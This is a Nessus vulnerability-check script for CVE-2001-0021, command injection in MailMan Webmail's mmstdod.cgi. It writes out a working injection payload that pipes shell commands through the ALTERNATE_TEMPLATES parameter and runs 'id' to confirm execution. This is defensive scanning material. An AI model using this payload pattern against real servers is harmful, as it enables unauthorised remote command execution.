#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
 script_id(10566);
 script_version ("$Revision: 1.26 $");
 script_cvs_date("$Date: 2016/11/19 01:42:51 $");

 script_cve_id("CVE-2001-0021");
 script_bugtraq_id(2063);
 script_osvdb_id(465);

 script_name(english:"MailMan Webmail mmstdod.cgi Arbitrary Command Execution");
 script_summary(english:"Checks for the presence of /cgi-bin/mmstdod.cgi");
 
 script_set_attribute( attribute:"synopsis",  value:
"A web application on the remote host has a command execution
vulnerability." );
 script_set_attribute( attribute:"description",  value:
"The version of MailMan Webmail on the remote web server has an
arbitrary command execution vulnerability.  Input to the
'ALTERNATE_TEMPLATES' parameter of mmstdod.cgi is not properly
sanitized.  A remote attacker could exploit this to execute
arbitrary commands on the system." );
 script_set_attribute(
   attribute:"see_also",
   value:"http://seclists.org/bugtraq/2000/Dec/93"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Upgrade to MailMan Webmail 3.0.26 or later."
 );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2000/12/06");
 script_set_attribute(attribute:"vuln_publication_date", value: "2000/12/06");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/a:gnu:mailman");
 script_end_attributes();

 script_category(ACT_ATTACK);
 script_family(english:"CGI abuses");

 script_copyright(english:"This script is Copyright (C) 2000-2016 Tenable Network Security, Inc.");

 script_dependencie("http_version.nasl");
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_ports("Services/www", 80);

 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


req = "/mmstdod.cgi?ALTERNATE_TEMPLATES=|%20echo%20" + raw_string(0x22) + 
 			         "Content-Type:%20text%2Fhtml" + raw_string(0x22) +
				 "%3Becho%20" +
				 raw_string(0x22, 0x22) +
				 "%20%3B%20id%00";

http_check_remote_code (
			check_request:req,
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id"
			);
